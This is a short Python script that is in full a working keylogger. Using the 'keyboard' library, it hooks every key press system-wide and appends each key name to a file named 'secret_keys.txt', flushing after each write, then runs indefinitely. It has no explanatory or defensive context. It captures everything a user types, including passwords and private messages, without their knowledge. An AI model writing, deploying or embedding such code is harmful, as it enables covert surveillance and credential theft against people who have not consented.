import keyboard

out_file = open("secret_keys.txt", "w")

def new_key(event):
    button = event.name
    out_file.write(button)
    out_file.flush()

keyboard.on_press(callback = new_key)
keyboard.wait()
